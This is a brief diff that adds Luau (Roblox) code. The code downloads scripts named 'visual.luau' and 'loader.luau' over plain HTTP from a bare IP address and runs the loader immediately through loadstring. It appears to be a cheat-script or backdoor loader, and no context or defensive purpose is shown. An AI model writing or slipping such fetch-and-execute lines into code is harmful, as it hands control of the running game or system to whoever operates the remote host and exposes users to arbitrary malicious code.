@@ -1,0 +1,4 @@
+ID = "bd88972f-dad3-4709-b22d-dcbe420d2c6a";
+petgoASTRO = loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
